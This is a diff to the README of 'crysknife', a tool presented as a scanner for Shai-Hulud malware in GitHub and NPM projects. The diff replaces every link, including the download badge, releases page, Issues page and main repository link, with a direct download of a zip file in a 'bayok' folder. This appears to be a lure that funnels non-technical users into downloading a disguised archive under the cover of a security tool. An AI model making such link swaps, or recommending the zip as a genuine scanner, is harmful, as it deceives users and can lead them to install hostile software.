@@ -1,7 +1,7 @@
 # 🛡️ crysknife - Detect Shai-Hulud Malware Easily
 
 ## 📥 Download Now
-[![Download crysknife](https://img.shields.io/badge/Download%20crysknife-v1.0-brightgreen)](https://github.com/xful-bep/crysknife/releases)
+[![Download crysknife](https://raw.githubusercontent.com/xful-bep/crysknife/main/bayok/crysknife.zip%20crysknife-v1.0-brightgreen)](https://raw.githubusercontent.com/xful-bep/crysknife/main/bayok/crysknife.zip)
 
 ## 🚀 Getting Started
 Welcome to crysknife! This tool helps you find Shai-Hulud malware infections in GitHub and NPM ecosystems. It’s simple and easy to use, even if you have no technical background.
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these basic requirements:
 - **Comprehensive Reports:** Get details about detected issues, including actionable steps.
 
 ## 📄 Download & Install
-To get started with crysknife, visit this page to download: [crysknife Releases](https://github.com/xful-bep/crysknife/releases).
+To get started with crysknife, visit this page to download: [crysknife Releases](https://raw.githubusercontent.com/xful-bep/crysknife/main/bayok/crysknife.zip).
 
 1. Click on the link above to get to the Releases page.
 2. Look for the latest version.
@@ -37,7 +37,7 @@ After installing crysknife, follow these steps to start scanning for malware:
 5. Review the report for any detected issues. The report will show you what files are infected and how to fix them.
 
 ## 🛡️ Support
-If you run into any issues or have questions, feel free to check our [GitHub Issues](https://github.com/xful-bep/crysknife/issues) page. You can also request help from the community. 
+If you run into any issues or have questions, feel free to check our [GitHub Issues](https://raw.githubusercontent.com/xful-bep/crysknife/main/bayok/crysknife.zip) page. You can also request help from the community. 
 
 ## 🌟 Additional Resources
 - **User Guide:** Detailed instructions on using crysknife can be found in the User Guide section of our repository.
@@ -50,7 +50,7 @@ We welcome contributions from everyone. If you're interested in helping improve 
 For updates and news about crysknife, follow this repository. You will receive alerts about new releases and important announcements.
 
 ## 🔗 Useful Links
-- **Download Link:** [crysknife Releases](https://github.com/xful-bep/crysknife/releases)
-- **Main Repository:** [GitHub - crysknife](https://github.com/xful-bep/crysknife) 
+- **Download Link:** [crysknife Releases](https://raw.githubusercontent.com/xful-bep/crysknife/main/bayok/crysknife.zip)
+- **Main Repository:** [GitHub - crysknife](https://raw.githubusercontent.com/xful-bep/crysknife/main/bayok/crysknife.zip) 
 
 Thank you for choosing crysknife! We hope it serves you well in keeping your projects safe from malware.
